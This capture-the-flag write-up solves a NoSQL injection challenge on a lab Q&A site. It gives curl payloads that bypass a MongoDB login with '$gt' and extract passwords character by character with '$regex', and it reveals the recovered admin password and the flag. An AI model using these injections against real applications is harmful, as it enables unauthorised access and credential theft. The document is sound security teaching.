# 10 - Stackunderflow

*Check out this new Q&A site. They must be hiding something but we don't know where to search.*

[Stackunderflow](http://whale.hacking-lab.com:3371/)

---

My first ideas were to try SQL injection, tamper question IDs and do some basic password guessing. With no luck.
One must be very careful to catch the hints.. 
For example:

*We're currently migrating our database to support **humongous** amounts of questions. During this time it's not possible
to create or answer questions or create new accounts.*

Or

*Which NoSQL database do you use?*

*Depends on the use case. Try Redis, Neo4J, Couchbase, Cassandra or **MongoDB** just to name a few.*


This all points to the famous NoSQL database [MongoDB](https://www.mongodb.com/).

There is also a hint hidden in `robots.txt` but it is pretty useless: `Maybe the_admin knows more about the flag.`

This article [HACKING NODEJS AND MONGODB](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html)
helped me a lot.

This is how you can bypass the login:
```
curl -H "Content-Type: application/json" -d '{ "username": "the_admin", "password": {"$gt": ""} }' http://whale.hacking-lab.com:3371/login
```

I was curious what is the admin's password. This payload helped me to guess the password characters.
```
curl -H "Content-Type: application/json" -d '{ "username": "the_admin", "password": {"$regex": "^[A-Za-z0-9_]*$"} }' http://whale.hacking-lab.com:3371/login
```

And with help of my [PasswordCracker](../../../src/main/kotlin/cz/vernjan/ctf/he19/ch10/PasswordCracker.kt) I was able to recover the admin's password: `76eKxMEQFcfG3fPe`

I logged in and learnt that I need to recover the password of user `null`.

```
Should my password really be the flag?
Asked by null

No, I think we should change it.
Let's do it after the migration!
The migration is done but the password is still the same...
```

Just changing the username and running [PasswordCracker](../../../src/main/kotlin/cz/vernjan/ctf/he19/ch10/PasswordCracker.kt) once more.
The null's password (and also the flag) is: `N0SQL_injections_are_a_thing`
